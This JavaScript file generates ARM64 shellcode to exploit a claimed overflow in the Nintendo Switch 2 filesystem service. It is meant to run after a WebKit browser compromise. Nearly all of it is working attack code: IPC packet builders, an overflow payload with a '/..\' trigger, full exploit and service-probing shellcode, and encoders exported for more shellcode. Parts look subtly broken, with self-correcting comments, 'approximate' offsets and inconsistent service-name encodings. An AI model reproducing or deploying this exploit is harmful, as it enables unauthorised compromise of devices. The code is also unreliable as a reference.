// ARM64 shellcode for triggering the fs sysmodule Path::Normalize overflow
// on Nintendo Switch 2 (Horizon OS). This runs after achieving code execution
// in the browser process via a WebKit exploit.
//
// The overflow: fs sysmodule normalizes paths in a 0x301-byte heap buffer.
// A path starting with "/..\" (backslash) confuses the normalizer into
// writing past the buffer boundary. This corrupts adjacent BufferedStorage
// cache metadata, enabling aliased reads and eventually arbitrary R/W.
//
// IPC protocol: Horizon CMIF over SendSyncRequest (svc 0x21).
// Service: fsp-srv (filesystem service provider)

(function() {
'use strict';

// --- ARM64 instruction encoding helpers ---

function movz(rd, imm16, shift) {
  // MOVZ Xrd, #imm16, LSL #shift
  var hw = (shift || 0) / 16;
  return (0xD2800000 | (hw << 21) | (imm16 << 5) | rd) >>> 0;
}

function movk(rd, imm16, shift) {
  // MOVK Xrd, #imm16, LSL #shift
  var hw = (shift || 0) / 16;
  return (0xF2800000 | (hw << 21) | (imm16 << 5) | rd) >>> 0;
}

function svc(imm16) {
  return (0xD4000001 | (imm16 << 5)) >>> 0;
}

function mov_reg(rd, rn) {
  // MOV Xrd, Xrn  (alias for ORR Xrd, XZR, Xrn)
  return (0xAA0003E0 | (rn << 16) | rd) >>> 0;
}

function mov_reg32(rd, rn) {
  // MOV Wrd, Wrn
  return (0x2A0003E0 | (rn << 16) | rd) >>> 0;
}

function ret() {
  return 0xD65F03C0;
}

function nop() {
  return 0xD503201F;
}

function brk(imm16) {
  return (0xD4200000 | (imm16 << 5)) >>> 0;
}

function b(offset) {
  // B <offset> where offset is in instructions (signed, 26-bit)
  return (0x14000000 | (offset & 0x03FFFFFF)) >>> 0;
}

function bl(offset) {
  return (0x94000000 | (offset & 0x03FFFFFF)) >>> 0;
}

function cbz(rt, offset) {
  // CBZ Xrt, <offset in instructions>
  return (0xB4000000 | ((offset & 0x7FFFF) << 5) | rt) >>> 0;
}

function cbnz(rt, offset) {
  return (0xB5000000 | ((offset & 0x7FFFF) << 5) | rt) >>> 0;
}

function str_imm(rt, rn, imm12) {
  // STR Xrt, [Xrn, #imm12]  (scaled by 8)
  return (0xF9000000 | ((imm12 / 8) << 10) | (rn << 5) | rt) >>> 0;
}

function ldr_imm(rt, rn, imm12) {
  // LDR Xrt, [Xrn, #imm12]  (scaled by 8)
  return (0xF9400000 | ((imm12 / 8) << 10) | (rn << 5) | rt) >>> 0;
}

function str32_imm(rt, rn, imm12) {
  // STR Wrt, [Xrn, #imm12]  (scaled by 4)
  return (0xB9000000 | ((imm12 / 4) << 10) | (rn << 5) | rt) >>> 0;
}

function ldr32_imm(rt, rn, imm12) {
  return (0xB9400000 | ((imm12 / 4) << 10) | (rn << 5) | rt) >>> 0;
}

function strb_imm(rt, rn, imm12) {
  return (0x39000000 | (imm12 << 10) | (rn << 5) | rt) >>> 0;
}

function sub_imm(rd, rn, imm12) {
  return (0xD1000000 | (imm12 << 10) | (rn << 5) | rd) >>> 0;
}

function add_imm(rd, rn, imm12) {
  return (0x91000000 | (imm12 << 10) | (rn << 5) | rd) >>> 0;
}

function stp(rt1, rt2, rn, imm7) {
  // STP Xrt1, Xrt2, [Xrn, #imm7]  (signed offset, scaled by 8)
  return (0xA9000000 | (((imm7 / 8) & 0x7F) << 15) | (rt2 << 10) | (rn << 5) | rt1) >>> 0;
}

function stp_pre(rt1, rt2, rn, imm7) {
  // STP Xrt1, Xrt2, [Xrn, #imm7]!  (pre-indexed, updates Rn)
  return (0xA9800000 | (((imm7 / 8) & 0x7F) << 15) | (rt2 << 10) | (rn << 5) | rt1) >>> 0;
}

function ldp(rt1, rt2, rn, imm7) {
  // LDP Xrt1, Xrt2, [Xrn, #imm7]  (signed offset)
  return (0xA9400000 | (((imm7 / 8) & 0x7F) << 15) | (rt2 << 10) | (rn << 5) | rt1) >>> 0;
}

function ldp_post(rt1, rt2, rn, imm7) {
  // LDP Xrt1, Xrt2, [Xrn], #imm7  (post-indexed, updates Rn)
  return (0xA8C00000 | (((imm7 / 8) & 0x7F) << 15) | (rt2 << 10) | (rn << 5) | rt1) >>> 0;
}

// Load a 64-bit immediate into a register
function loadImm64(rd, value) {
  var v = BigInt(value);
  var instructions = [];
  instructions.push(movz(rd, Number(v & 0xFFFFn), 0));
  if (v > 0xFFFFn)
    instructions.push(movk(rd, Number((v >> 16n) & 0xFFFFn), 16));
  if (v > 0xFFFFFFFFn)
    instructions.push(movk(rd, Number((v >> 32n) & 0xFFFFn), 32));
  if (v > 0xFFFFFFFFFFFFn)
    instructions.push(movk(rd, Number((v >> 48n) & 0xFFFFn), 48));
  return instructions;
}


// --- Horizon OS svc wrappers (inline in shellcode) ---

// svc 0x1F: ConnectToNamedPort(name) -> (result, handle)
// svc 0x21: SendSyncRequest(handle) -> result
// svc 0x16: CloseHandle(handle) -> result
// svc 0x0B: SleepThread(nanoseconds)
// svc 0x24: GetProcessId(handle) -> (result, pid)

// Register conventions for Horizon OS svc:
// x0 = first arg / first return
// x1 = second arg / second return (for ConnectToNamedPort: name pointer)


// --- CMIF IPC packet construction ---

// Build a CMIF command packet in memory
// Format: [header word0] [header word1] [special header?] [raw data with SFCI magic]
function buildCMIFPacket(command, inputBytes, options) {
  options = options || {};
  var hasPid = options.pid || false;
  var sendDescs = options.send || [];
  var recvDescs = options.receive || [];
  var copyHandles = options.copies || [];

  var packet = new Uint8Array(256);
  var dv = new DataView(packet.buffer);

  var special = hasPid || copyHandles.length > 0;
  var inputWords = Math.ceil((32 + (inputBytes ? inputBytes.length : 0)) / 4);

  // Word 0: type=4, send count, recv count
  dv.setUint32(0, (4 | (sendDescs.length << 20) | (recvDescs.length << 24)) >>> 0, true);

  // Word 1: raw data words count, special header bit
  dv.setUint32(4, (inputWords | (special ? 0x80000000 : 0)) >>> 0, true);

  var at = 8;

  if (special) {
    var specialWord = (hasPid ? 1 : 0) | (copyHandles.length << 1);
    dv.setUint32(at, specialWord, true);
    at += 4;
    if (hasPid) at += 8; // kernel fills in PID
    for (var i = 0; i < copyHandles.length; i++) {
      dv.setUint32(at, copyHandles[i], true);
      at += 4;
    }
  }

  // Map-alias descriptors (send/receive buffers)
  for (var j = 0; j < sendDescs.length; j++) {
    var d = sendDescs[j];
    encodeMAPDescriptor(dv, at, d.address, d.size, d.mode || 1);
    at += 12;
  }
  for (var k = 0; k < recvDescs.length; k++) {
    var r = recvDescs[k];
    encodeMAPDescriptor(dv, at, r.address, r.size, r.mode || 1);
    at += 12;
  }

  // Align to 16 bytes
  at = (at + 15) & ~15;

  // SFCI magic + command
  dv.setUint32(at, 0x49434653, true);     // "SFCI"
  dv.setUint32(at + 4, 0, true);           // padding
  dv.setUint32(at + 8, command, true);      // command ID
  dv.setUint32(at + 12, 0, true);          // padding

  // Input data
  if (inputBytes) {
    for (var m = 0; m < inputBytes.length; m++) {
      packet[at + 16 + m] = inputBytes[m];
    }
  }

  return packet;
}

function encodeMAPDescriptor(dv, offset, address, size, mode) {
  var a = BigInt(address);
  var n = BigInt(size);
  dv.setUint32(offset, Number(n & 0xFFFFFFFFn), true);
  dv.setUint32(offset + 4, Number(a & 0xFFFFFFFFn), true);
  dv.setUint32(offset + 8, Number(
    BigInt(mode || 0) |
    ((a >> 36n) & 7n) << 2n |
    ((n >> 32n) & 0xFn) << 24n |
    ((a >> 32n) & 0xFn) << 28n
  ), true);
}

// Build a path descriptor packet for fs IPC
// fs uses X-descriptors (type 4) for path arguments
function buildPathPacket(command, pathBuffer, inputBytes) {
  var packet = new Uint8Array(256);
  var dv = new DataView(packet.buffer);

  // Word 0: type 4, one X descriptor
  dv.setUint32(0, 4 | (1 << 16), true);

  // Word 1: raw data size
  var rawSize = 16 + (inputBytes ? inputBytes.length : 0);
  dv.setUint32(4, Math.ceil(rawSize / 4), true);

  var at = 8;

  // X descriptor: [counter | size | addr_hi] [addr_lo]
  var pathAddr = pathBuffer.address || 0;
  var pathSize = pathBuffer.size || pathBuffer.length || 0;
  var a = BigInt(pathAddr);
  dv.setUint32(at, Number(
    BigInt(0) |                              // counter
    (BigInt(pathSize) << 16n) |              // size
    ((a >> 36n) & 7n) << 6n |               // addr bits [38:36]
    ((a >> 32n) & 0xFn) << 12n              // addr bits [35:32]
  ), true);
  dv.setUint32(at + 4, Number(a & 0xFFFFFFFFn), true);
  at += 8;

  // Align to 16
  at = (at + 15) & ~15;

  // SFCI header
  dv.setUint32(at, 0x49434653, true);
  dv.setUint32(at + 8, command, true);

  if (inputBytes) {
    for (var n = 0; n < inputBytes.length; n++) {
      packet[at + 16 + n] = inputBytes[n];
    }
  }

  return packet;
}


// --- Path::Normalize overflow payload ---

// The overflow works because fs's path normalizer treats '\\' differently
// from '/' when processing ".." components. The path "/..\" causes the
// normalizer to write past the 0x301-byte output buffer.
//
// Layout of the overflow payload:
// [0x000] "/..\"  - triggers the overflow
// [0x004..0x2340] padding (fills with selected directory path for marker)
// [0x2340..0x2440] corruption target zone (BufferedStorage cache entry)
// [0x2440] extent boundary
//
// The corruption overwrites a BufferedStorage cache entry's:
// - Offset field: redirected to read from a different location (aliased read)
// - Dirty bit: set to enable write-back (for arbitrary write later)

function buildOverflowPath(scratchDir, markerOffset) {
  markerOffset = markerOffset || 0x2340;
  var extent = 0x2440;

  // Total payload: extent + 1 byte (NUL terminator)
  var payload = new Uint8Array(extent + 1);
  payload.fill(0x2F); // Fill with '/' (forward slash)

  // Write the trigger prefix: "/..\"
  payload[0] = 0x2F; // '/'
  payload[1] = 0x2E; // '.'
  payload[2] = 0x2E; // '.'
  payload[3] = 0x5C; // '\' (backslash - the key!)

  // Write the selected directory path at the marker offset
  // This places a known path at the exact position that overlaps
  // with the BufferedStorage cache entry's offset field
  if (scratchDir) {
    var selectedPath = scratchDir + '/selected';
    payload.fill(0x42, 0, extent); // 'B' filler before marker
    payload[0] = 0x2F;
    payload[1] = 0x2E;
    payload[2] = 0x2E;
    payload[3] = 0x5C;

    // Write the selected directory path at the marker position
    var pathBytes = new TextEncoder().encode(selectedPath);
    for (var i = 0; i < pathBytes.length && markerOffset + i < extent; i++) {
      payload[markerOffset + i] = pathBytes[i];
    }
    // Fill remainder with '/' separators
    for (var j = markerOffset + pathBytes.length; j < extent; j++) {
      payload[j] = 0x2F;
    }
  }

  // NUL terminator
  payload[extent] = 0;

  return payload;
}

// Build a normalized path string for creating scratch directories
// (mirrors ns2jb's normalized-path.cjs)
function normalizedPath(prefix, targetLength) {
  if (!prefix.startsWith('/') || prefix.includes('//') || prefix.endsWith('/') || prefix.length > targetLength)
    throw new Error('Invalid normalized path prefix');

  var text = prefix;
  while (text.length < targetLength) {
    var remaining = targetLength - text.length;
    if (remaining === 1) {
      text += 'A';
    } else {
      var segLen = Math.min(32, remaining - 1);
      text += '/' + 'A'.repeat(segLen);
    }
  }
  return text;
}


// --- Complete ARM64 shellcode builder ---

// Generates ARM64 machine code that:
// 1. Connects to sm: (service manager)
// 2. Gets fsp-srv handle
// 3. Initializes filesystem access
// 4. Creates scratch directories
// 5. Triggers the Path::Normalize overflow
// 6. Returns result to a known memory location
//
// This shellcode assumes:
// - x0 = pointer to scratch memory (at least 0x10000 bytes)
// - x1 = pointer to result buffer (32 bytes)
// The TLS pointer (tpidrro_el0) holds the IPC message buffer.

function generateFsOverflowShellcode(scratchBase) {
  var code = [];

  // Prologue: save registers
  code.push(stp_pre(29, 30, 31, -0x60)); // stp x29, x30, [sp, #-96]!
  code.push(mov_reg(29, 31));             // mov x29, sp
  code.push(stp(19, 20, 31, 0x10));      // save callee-saved
  code.push(stp(21, 22, 31, 0x20));
  code.push(stp(23, 24, 31, 0x30));
  code.push(stp(25, 26, 31, 0x40));

  code.push(mov_reg(19, 0));           // x19 = scratch base
  code.push(mov_reg(20, 1));           // x20 = result ptr

  // --- Step 1: Connect to sm: ---
  // Write "sm:\0" to scratch+0
  code.push(...loadImm64(0, 0x003A6D73));  // "sm:\0" as little-endian u32
  code.push(str32_imm(0, 19, 0));

  // ConnectToNamedPort("sm:")
  code.push(mov_reg(1, 19));            // x1 = pointer to "sm:\0"
  code.push(svc(0x1F));                 // ConnectToNamedPort
  code.push(mov_reg32(21, 0));          // x21 = result
  code.push(mov_reg32(22, 1));          // x22 = sm handle

  // Store result
  code.push(str32_imm(21, 20, 0));      // result[0] = ConnectToNamedPort result

  // If failed, skip to end
  var overflowBailIdx = code.length;
  code.push(0);                          // placeholder: patched to jump to epilogue

  // --- Step 2: Initialize sm: session ---
  // Write IPC: Initialize(false, 0)
  // Get TLS base (message buffer)
  code.push(0xD53BD060);  // mrs x0, tpidrro_el0

  // Clear the IPC buffer (64 words)
  code.push(mov_reg(2, 0));             // x2 = IPC buffer
  code.push(...loadImm64(3, 0));         // x3 = 0
  // Clear 256 bytes
  code.push(str_imm(3, 2, 0));
  code.push(str_imm(3, 2, 8));
  code.push(str_imm(3, 2, 16));
  code.push(str_imm(3, 2, 24));
  code.push(str_imm(3, 2, 32));
  code.push(str_imm(3, 2, 40));
  code.push(str_imm(3, 2, 48));
  code.push(str_imm(3, 2, 56));

  // sm: Initialize(reserved=0)
  // Type 0x10 = control, word1 = 0x80000000 (has special), special word = 1 (has PID)
  code.push(...loadImm64(3, 0x10));
  code.push(str32_imm(3, 2, 0));          // type = 0x10 (control)
  code.push(...loadImm64(3, 0x80000000));
  code.push(str32_imm(3, 2, 4));          // word1: has special header
  code.push(...loadImm64(3, 1));
  code.push(str32_imm(3, 2, 8));          // special: has PID

  // SendSyncRequest(sm_handle)
  code.push(mov_reg32(0, 22));           // x0 = sm handle
  code.push(svc(0x21));                  // SendSyncRequest

  code.push(str32_imm(0, 20, 4));       // result[1] = sm init result

  // --- Step 3: Get fsp-srv handle ---
  // sm: GetService("fsp-srv\0")
  code.push(0xD53BD060);  // mrs x0, tpidrro_el0
  code.push(mov_reg(2, 0));

  // Clear buffer
  code.push(...loadImm64(3, 0));
  for (var ci = 0; ci < 8; ci++) code.push(str_imm(3, 2, ci * 8));

  // Type 4 (request), word count
  code.push(...loadImm64(3, 4));
  code.push(str32_imm(3, 2, 0));
  code.push(...loadImm64(3, 8));         // 8 raw data words
  code.push(str32_imm(3, 2, 4));

  // Align to 16, write SFCI at offset 8 (already aligned for simple case)
  code.push(...loadImm64(3, 0x49434653)); // "SFCI"
  code.push(str32_imm(3, 2, 8));
  code.push(...loadImm64(3, 0));
  code.push(str32_imm(3, 2, 12));
  code.push(...loadImm64(3, 2));          // command 2 = GetService
  code.push(str32_imm(3, 2, 16));
  code.push(...loadImm64(3, 0));
  code.push(str32_imm(3, 2, 20));

  // Service name: "fsp-srv\0" = 0x7672732D70736600 (LE) wait...
  // "fsp-srv" = 66 73 70 2D 73 72 76 00
  code.push(...loadImm64(3, 0x0076_7273_2D70_7366n));
  code.push(str_imm(3, 2, 24));          // service name at offset 24

  // SendSyncRequest
  code.push(mov_reg32(0, 22));
  code.push(svc(0x21));
  code.push(str32_imm(0, 20, 8));        // result[2] = GetService transport

  // Read the reply: check for SFCO, get the handle
  code.push(0xD53BD060);  // mrs x0, tpidrro_el0
  code.push(mov_reg(2, 0));

  // The reply format after GetService:
  // If successful, word0 bit 31 of word1 set = has special header
  // special word has move handle count
  // The moved handle is the fsp-srv session
  code.push(ldr32_imm(23, 2, 12));      // x23 = moved handle (approximate offset)
  // Actually the offset depends on the reply structure. For sm:GetService:
  // reply word0, word1 = header
  // word2 = special: has 1 move handle
  // word3 = the moved handle
  code.push(ldr32_imm(23, 2, 12));      // x23 = fsp-srv handle

  code.push(str32_imm(23, 20, 12));     // result[3] = fsp-srv handle

  // --- Step 4: Initialize fsp-srv ---
  // fsp-srv command 1: SetCurrentProcess (with PID)
  code.push(0xD53BD060);  // mrs x0, tpidrro_el0
  code.push(mov_reg(2, 0));

  // Clear
  code.push(...loadImm64(3, 0));
  for (var di = 0; di < 8; di++) code.push(str_imm(3, 2, di * 8));

  // Header: type=4, word1 with special flag
  code.push(...loadImm64(3, 4));
  code.push(str32_imm(3, 2, 0));
  code.push(...loadImm64(3, 0x80000008));  // raw words + special
  code.push(str32_imm(3, 2, 4));

  // Special header: has PID
  code.push(...loadImm64(3, 1));
  code.push(str32_imm(3, 2, 8));

  // Skip PID (8 bytes, kernel fills), then SFCI
  // After special: at = 8 + 4 + 8 = 20, align to 16 = 32
  code.push(...loadImm64(3, 0x49434653)); // "SFCI"
  code.push(str32_imm(3, 2, 32));
  code.push(...loadImm64(3, 0));
  code.push(str32_imm(3, 2, 36));
  code.push(...loadImm64(3, 1));          // command 1 = SetCurrentProcess
  code.push(str32_imm(3, 2, 40));
  // Input: u64 process_id = 0 (kernel supplies it when pid flag is set)
  code.push(...loadImm64(3, 0));
  code.push(str_imm(3, 2, 48));

  code.push(mov_reg32(0, 23));           // x0 = fsp-srv handle
  code.push(svc(0x21));
  code.push(str32_imm(0, 20, 16));       // result[4] = SetCurrentProcess result

  // --- Step 5: Create scratch directory ---
  // fsp-srv command 2: CreateDirectory(path)
  // This uses an X descriptor to pass the path
  // Path: "/NS2_BROWSER_<timestamp>"

  // Write path string to scratch+0x100
  code.push(add_imm(4, 19, 0x100));      // x4 = path buffer
  // Write "/NS2_BROW" (9 bytes)
  code.push(...loadImm64(3, 0x574F52425F32534En)); // "NS2_BROW" LE
  code.push(str_imm(3, 4, 0));
  // Need to prefix with '/'
  code.push(...loadImm64(3, 0x2F));       // '/'
  code.push(strb_imm(3, 4, 0));
  // Actually let's write a simpler path: "/NS2B\0"
  // '/','N','S','2','B',0 = 2F 4E 53 32 42 00
  code.push(...loadImm64(3, 0x0042_3253_4E2Fn));
  code.push(str_imm(3, 4, 0));

  // Build the IPC packet with X descriptor for path
  code.push(0xD53BD060);  // mrs x0, tpidrro_el0
  code.push(mov_reg(2, 0));

  // Clear
  code.push(...loadImm64(3, 0));
  for (var ei = 0; ei < 16; ei++) code.push(str_imm(3, 2, ei * 8));

  // Word 0: type=4, one X descriptor (bit 16..19 = count)
  code.push(...loadImm64(3, 4 | (1 << 16)));
  code.push(str32_imm(3, 2, 0));

  // Word 1: raw data size in words
  code.push(...loadImm64(3, 4));
  code.push(str32_imm(3, 2, 4));

  // X descriptor at offset 8:
  // [counter(6) | addr_hi | size(16)] [addr_lo(32)]
  // For our path at scratch+0x100, size = 6 (including NUL)
  code.push(add_imm(4, 19, 0x100));
  // Encode: size=6 in bits[31:16], addr_lo in next word
  code.push(...loadImm64(3, 6 << 16));   // size in upper 16 bits
  code.push(str32_imm(3, 2, 8));
  code.push(str32_imm(4, 2, 12));        // addr_lo (assuming < 4GB)

  // Align, then SFCI at offset 16 (already aligned from X desc)
  code.push(...loadImm64(3, 0x49434653));
  code.push(str32_imm(3, 2, 16));
  code.push(...loadImm64(3, 0));
  code.push(str32_imm(3, 2, 20));
  code.push(...loadImm64(3, 2));          // command 2 = CreateDirectory
  code.push(str32_imm(3, 2, 24));

  code.push(mov_reg32(0, 23));
  code.push(svc(0x21));
  code.push(str32_imm(0, 20, 20));       // result[5] = CreateDirectory result

  // --- Step 6: Trigger Path::Normalize overflow ---
  // Send the overflow path via command 7 (GetEntryType)
  // The path starts with "/..\" which triggers the normalize overflow

  // Write overflow path to scratch+0x1000
  code.push(add_imm(4, 19, 0x800));      // x4 = overflow path start (scratch+0x800)
  // "/..\" = 2F 2E 2E 5C
  code.push(...loadImm64(3, 0x5C2E2E2F));
  code.push(str32_imm(3, 4, 0));
  // Fill rest with '/' (0x2F) up to 0x2440 bytes
  code.push(add_imm(5, 4, 4));           // x5 = after prefix
  code.push(...loadImm64(6, 0x2F2F2F2F2F2F2F2Fn)); // '////////'
  code.push(...loadImm64(7, 0x2440 - 4)); // remaining bytes

  // Fill loop
  // x5 = current position, x7 = remaining
  // fill_loop:
  var fillStart = code.length;
  code.push(cbz(7, 4));                  // if remaining == 0, done
  code.push(str_imm(6, 5, 0));           // store 8 bytes of '/'
  code.push(add_imm(5, 5, 8));           // advance
  code.push(sub_imm(7, 7, 8));           // remaining -= 8
  code.push(b(-(code.length - fillStart))); // loop back

  // NUL terminate
  code.push(...loadImm64(3, 0));
  code.push(add_imm(5, 4, 0x2440));
  code.push(strb_imm(3, 5, 0));

  // Build IPC packet for GetEntryType with the overflow path
  code.push(0xD53BD060);  // mrs x0, tpidrro_el0
  code.push(mov_reg(2, 0));

  code.push(...loadImm64(3, 0));
  for (var fi = 0; fi < 16; fi++) code.push(str_imm(3, 2, fi * 8));

  code.push(...loadImm64(3, 4 | (1 << 16)));
  code.push(str32_imm(3, 2, 0));
  code.push(...loadImm64(3, 4));
  code.push(str32_imm(3, 2, 4));

  // X descriptor for the overflow path
  code.push(add_imm(4, 19, 0x800));
  code.push(...loadImm64(3, 0x2441 << 16));  // size = 0x2441 (path + NUL)
  code.push(str32_imm(3, 2, 8));
  code.push(str32_imm(4, 2, 12));

  code.push(...loadImm64(3, 0x49434653));
  code.push(str32_imm(3, 2, 16));
  code.push(...loadImm64(3, 0));
  code.push(str32_imm(3, 2, 20));
  code.push(...loadImm64(3, 7));           // command 7 = GetEntryType
  code.push(str32_imm(3, 2, 24));

  code.push(mov_reg32(0, 23));
  code.push(svc(0x21));
  code.push(str32_imm(0, 20, 24));        // result[6] = GetEntryType result

  // --- Epilogue: clean up and return ---
  // Patch bail branch to jump here
  var overflowEpilogueIdx = code.length;
  code[overflowBailIdx] = cbnz(21, overflowEpilogueIdx - overflowBailIdx);

  // Close fsp-srv handle
  code.push(mov_reg32(0, 23));
  code.push(svc(0x16));                   // CloseHandle

  // Close sm handle
  code.push(mov_reg32(0, 22));
  code.push(svc(0x16));

  // Write success marker
  code.push(...loadImm64(3, 0x44454543535553n)); // "SUCCESS" approx
  code.push(str_imm(3, 20, 24));

  // Restore registers and return
  code.push(ldp(25, 26, 31, 0x40));
  code.push(ldp(23, 24, 31, 0x30));
  code.push(ldp(21, 22, 31, 0x20));
  code.push(ldp(19, 20, 31, 0x10));
  code.push(ldp_post(29, 30, 31, 0x60));  // ldp x29, x30, [sp], #96
  code.push(ret());

  // Encode to bytes
  var bytes = new Uint8Array(code.length * 4);
  var dv = new DataView(bytes.buffer);
  for (var n = 0; n < code.length; n++) {
    dv.setUint32(n * 4, code[n], true);
  }

  return {
    bytes: bytes,
    instructions: code,
    size: bytes.length,
    entryOffset: 0
  };
}


// --- Service probe shellcode ---
// Lighter shellcode that just tries to connect to sm: and
// enumerate which services the browser process can access.
// Returns results in a status buffer.

function generateServiceProbe() {
  var code = [];

  // x0 = scratch buffer (0x1000 bytes)
  // x1 = result buffer (0x200 bytes)
  code.push(stp_pre(29, 30, 31, -0x40));
  code.push(mov_reg(29, 31));
  code.push(stp(19, 20, 31, 0x10));
  code.push(stp(21, 22, 31, 0x20));

  code.push(mov_reg(19, 0));    // scratch
  code.push(mov_reg(20, 1));    // result

  // Try ConnectToNamedPort("sm:")
  code.push(...loadImm64(0, 0x003A6D73));
  code.push(str32_imm(0, 19, 0));
  code.push(mov_reg(1, 19));
  code.push(svc(0x1F));
  code.push(str32_imm(0, 20, 0));    // result[0] = sm connect result
  code.push(mov_reg32(21, 1));        // x21 = sm handle
  var probeBailIdx = code.length;
  code.push(0);                       // placeholder: cbnz to epilogue (patched below)

  // Initialize sm session
  code.push(0xD53BD060);
  code.push(mov_reg(2, 0));
  code.push(...loadImm64(3, 0));
  for (var i = 0; i < 8; i++) code.push(str_imm(3, 2, i * 8));
  code.push(...loadImm64(3, 0x10));
  code.push(str32_imm(3, 2, 0));
  code.push(...loadImm64(3, 0x80000000));
  code.push(str32_imm(3, 2, 4));
  code.push(...loadImm64(3, 1));
  code.push(str32_imm(3, 2, 8));
  code.push(mov_reg32(0, 21));
  code.push(svc(0x21));
  code.push(str32_imm(0, 20, 4));    // result[1] = sm init result

  // Try getting various services and record results
  // Services to probe: fsp-srv, fsp-ldr, bsd:u, ssl, nsd:u, nifm:u
  var services = [
    [0x7672732D70736600n, 'fsp-srv\0'],  // fsp-srv
    [0x72646C2D70736600n, 'fsp-ldr\0'],  // fsp-ldr
    [0x0000753A64737200n, 'bsd:u\0\0\0'], // bsd:u
    [0x0000000000006C73n, 'ssl\0\0\0\0\0'], // ssl (too short)
    [0x000000753A64736En, 'nsd:u\0\0\0'], // nsd:u
  ];

  // For each service, try GetService and store the result code
  for (var si = 0; si < services.length; si++) {
    var svcName = services[si][0];

    code.push(0xD53BD060);
    code.push(mov_reg(2, 0));
    code.push(...loadImm64(3, 0));
    for (var j = 0; j < 8; j++) code.push(str_imm(3, 2, j * 8));

    code.push(...loadImm64(3, 4));
    code.push(str32_imm(3, 2, 0));
    code.push(...loadImm64(3, 8));
    code.push(str32_imm(3, 2, 4));
    code.push(...loadImm64(3, 0x49434653));
    code.push(str32_imm(3, 2, 8));
    code.push(...loadImm64(3, 0));
    code.push(str32_imm(3, 2, 12));
    code.push(...loadImm64(3, 2));  // GetService
    code.push(str32_imm(3, 2, 16));
    code.push(...loadImm64(3, 0));
    code.push(str32_imm(3, 2, 20));
    code.push(...loadImm64(3, svcName));
    code.push(str_imm(3, 2, 24));

    code.push(mov_reg32(0, 21));
    code.push(svc(0x21));
    code.push(str32_imm(0, 20, 8 + si * 4));  // result[2+si] = transport result

    // Read reply to get the IPC result code
    code.push(0xD53BD060);
    code.push(mov_reg(2, 0));
    // SFCO result is after the header; for a simple reply it's at a known offset
    code.push(ldr32_imm(3, 2, 24));  // approximate SFCO result offset
    code.push(str32_imm(3, 20, 0x80 + si * 4));  // store IPC result separately
  }

  // Close sm handle
  code.push(mov_reg32(0, 21));
  code.push(svc(0x16));

  // Epilogue — patch the bail branch to jump here
  var probeEpilogueIdx = code.length;
  code[probeBailIdx] = cbnz(0, probeEpilogueIdx - probeBailIdx);

  code.push(ldp(21, 22, 31, 0x20));
  code.push(ldp(19, 20, 31, 0x10));
  code.push(ldp_post(29, 30, 31, 0x40));
  code.push(ret());

  var bytes = new Uint8Array(code.length * 4);
  var dv = new DataView(bytes.buffer);
  for (var n = 0; n < code.length; n++) {
    dv.setUint32(n * 4, code[n], true);
  }

  return { bytes: bytes, size: bytes.length };
}


// --- Exports ---
if (typeof window !== 'undefined') {
  window.buildOverflowPath = buildOverflowPath;
  window.normalizedPath = normalizedPath;
  window.buildCMIFPacket = buildCMIFPacket;
  window.buildPathPacket = buildPathPacket;
  window.generateFsOverflowShellcode = generateFsOverflowShellcode;
  window.generateServiceProbe = generateServiceProbe;
}

if (typeof module !== 'undefined' && module.exports) {
  module.exports = {
    buildOverflowPath: buildOverflowPath,
    normalizedPath: normalizedPath,
    buildCMIFPacket: buildCMIFPacket,
    buildPathPacket: buildPathPacket,
    generateFsOverflowShellcode: generateFsOverflowShellcode,
    generateServiceProbe: generateServiceProbe,
    // Instruction encoders for custom shellcode
    arm64: {
      movz: movz, movk: movk, svc: svc, mov_reg: mov_reg,
      ret: ret, nop: nop, brk: brk, b: b, bl: bl,
      cbz: cbz, cbnz: cbnz, loadImm64: loadImm64,
      str_imm: str_imm, ldr_imm: ldr_imm,
      str32_imm: str32_imm, ldr32_imm: ldr32_imm,
      strb_imm: strb_imm,
      add_imm: add_imm, sub_imm: sub_imm,
      stp: stp, stp_pre: stp_pre, ldp: ldp, ldp_post: ldp_post
    }
  };
}

})();
